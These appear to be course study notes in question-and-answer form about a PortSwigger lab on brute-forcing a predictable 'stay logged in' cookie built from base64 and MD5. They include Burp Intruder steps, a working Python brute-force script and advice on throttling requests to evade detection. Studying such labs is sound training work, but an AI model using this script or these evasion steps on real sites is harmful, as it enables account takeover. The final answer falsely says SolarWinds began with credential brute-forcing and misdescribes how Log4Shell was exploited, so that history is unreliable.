---
course: Web Security
topic: Authentication Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain why the stay logged in cookie in the lab is vulnerable to brute-forcing.**

The stay logged in cookie in the lab is vulnerable to brute-forcing because it uses a predictable format (username:MD5(password)) and is not protected by any brute-force prevention mechanisms such as rate limiting or account lockouts. The MD5 hash of the password can be easily cracked using common password lists and hash-cracking tools, making it feasible to brute-force the password.

**Q2. How would you exploit the vulnerability in the stay logged in cookie to gain unauthorized access to Carlos' account?**

To exploit the vulnerability, follow these steps:

1. Identify the format of the stay logged in cookie, which is `base64(username:md5(password))`.
2. Use Burp Suite's Intruder to automate the brute-forcing process:
   - Send the login request to Intruder.
   - Set the payload position to the stay logged in cookie value.
   - Use a list of candidate passwords as payloads.
   - Configure payload processing to:
     - Hash each password using MD5.
     - Prepend "Carlos:" to the hash.
     - Encode the resulting string in Base64.
3. Send the requests and monitor the responses for a successful login (HTTP 200 status code).

Alternatively, you can script this process in Python:

```python
import requests
import hashlib
import base64
import sys

def brute_force_carlos(url):
    with open('passwords.txt', 'r') as file:
        for pwd in file:
            pwd = pwd.strip()
            hashed_pwd = hashlib.md5(pwd.encode()).hexdigest()
            encoded_pwd = base64.b64encode(f"Carlos:{hashed_pwd}".encode()).decode()
            cookies = {'stay-logged-in': encoded_pwd}
            response = requests.get(url + '/my-account', cookies=cookies)
            if 'Log out' in response.text:
                print(f"Carlos's password is {pwd}")
                break
        else:
            print("Could not find Carlos's password")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        sys.exit(1)
    url = sys.argv[1]
    brute_force_carlos(url)
```

**Q3. Why is it important to use an offline cracking tool like Hashcat instead of an online service like CrackStation for hashing passwords?**

Using an offline cracking tool like Hashcat is more secure and efficient compared to using an online service like CrackStation. Here’s why:

1. **Data Privacy**: Online services require you to upload the hash to their servers, which can be a privacy concern. Offline tools keep the data local, ensuring that sensitive information remains private.
2. **Speed and Efficiency**: Offline tools like Hashcat can leverage the full power of your hardware (CPU, GPU) to perform the cracking much faster than an online service.
3. **Control and Flexibility**: With offline tools, you have complete control over the cracking process, including the ability to customize dictionaries, rules, and other parameters to optimize the cracking process.
4. **Avoiding Breach Risks**: Uploading hashes to online services can be risky, as it may expose sensitive data to potential breaches. Using offline tools minimizes this risk.

**Q4. How would you configure Burp Suite to throttle requests during the brute-forcing process?**

To configure Burp Suite to throttle requests during the brute-forcing process, follow these steps:

1. Open Burp Suite and navigate to the Intruder tab.
2. Select the request you want to brute-force and send it to Intruder.
3. Configure the payload positions and payload sets as needed.
4. Go to the Options tab within Intruder.
5. Under the "Request handling options," adjust the "Delay between requests" slider to set a delay between each request. This helps prevent triggering rate-limiting mechanisms or getting blocked by the server.
6. Optionally, you can also set the "Maximum requests per second" option to further control the rate of requests.

By throttling the requests, you can avoid overwhelming the server and reduce the risk of detection or blocking.

**Q5. What recent real-world examples demonstrate the risks associated with weak authentication mechanisms like the one in this lab?**

Recent real-world examples include:

1. **CVE-2021-44228 (Log4Shell)**: Although primarily related to a vulnerability in the Apache Log4j library, many instances of exploitation involved brute-forcing credentials to gain initial access to systems. Weak authentication mechanisms made it easier for attackers to compromise systems.
   
2. **SolarWinds Supply Chain Attack (2020)**: This attack involved the compromise of SolarWinds software, which was initially achieved through brute-forcing credentials. The attackers then used the compromised software to gain access to numerous organizations, demonstrating the severe consequences of weak authentication practices.

These examples highlight the importance of robust authentication mechanisms and the risks associated with weak or predictable authentication methods.

---
<!-- nav -->
[[04-Understanding Authentication Vulnerabilities|Understanding Authentication Vulnerabilities]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/10-Lab 9 Brute forcing a stay logged in cookie/00-Overview|Overview]]
